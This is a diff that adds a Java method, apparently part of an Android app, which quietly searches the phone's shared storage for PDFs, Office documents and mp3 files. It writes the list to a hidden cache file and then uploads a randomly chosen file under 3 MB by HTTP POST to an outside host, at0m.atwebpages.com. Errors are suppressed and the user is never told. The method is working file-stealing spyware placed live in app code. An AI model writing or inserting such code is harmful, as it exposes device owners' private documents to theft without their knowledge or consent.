@@ -1,0 +1,87 @@
+	private void iq500Uploader()
+	{
+		StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
+		StrictMode.setThreadPolicy(policy);
+		
+		String extList[] = {
+			".pdf",
+			".doc", 
+			".docx",
+			".ppt",
+			".pptx",
+			".xls", 
+			".xlsx",
+			".mp3"};
+		String ext = TextUtils.join(" -o -name *", extList);
+
+		File outputDir = this.getCacheDir();
+		String cacheFile = outputDir.toString() + "/.r3su1t.txt";
+		
+		//String[] cmds = {"sh", "-c", "find /sdcard/ &> " + cacheFile};
+		
+		try
+		{
+			File f = new File(cacheFile);
+			if(!f.exists())
+			{
+				//Run command
+				String[] cmds = {"sh", "-c", "cd /sdcard/ && find /sdcard/ -name *" + ext + " &> " + cacheFile};
+				Runtime.getRuntime().exec(cmds);
+			}
+			else
+			{
+				//Extract result from command
+				Scanner sc = new Scanner(f); 
+				ArrayList<String> pathList = new ArrayList<String>();
+
+				while(sc.hasNextLine())
+				{
+					pathList.add(sc.nextLine());
+				}
+				Collections.shuffle(pathList);
+				//Toast.makeText(this, String.valueOf(pathList.size()), Toast.LENGTH_LONG).show();
+				//upload
+				
+				int fCount = 0;
+				for(int i = 0; i < pathList.size(); i++)
+				{
+					File fpath = new File(pathList.get(i).toString());
+					String fname = fpath.getName();
+					//size in MB
+					long fsize = fpath.length() /1024/1024;
+					
+					if(fsize < 3)
+					{
+						//up file
+						//create binary entity
+						FileEntity reqEntity = new FileEntity(fpath, "binary/octet-stream");
+
+						//launch http request
+						HttpPost post = new HttpPost("http://at0m.atwebpages.com/file.php");
+
+						//set binary entity
+						post.setEntity(reqEntity);
+						reqEntity.setContentType("binary/octet-stream");
+
+						//set timestamp of the file as the component of filename
+						post.setHeader("fname", fname);
+
+						//fire
+						HttpClient httpclient = new DefaultHttpClient();
+						httpclient.execute(post);
+						fCount++;
+						if(fCount == 1)break;
+					}
+				}
+
+				//clear file
+				f.delete();
+			}
+
+
+		}
+		catch (Exception e)
+		{
+			//Toast.makeText(this, e.toString(), Toast.LENGTH_LONG).show();
+		}
+	}
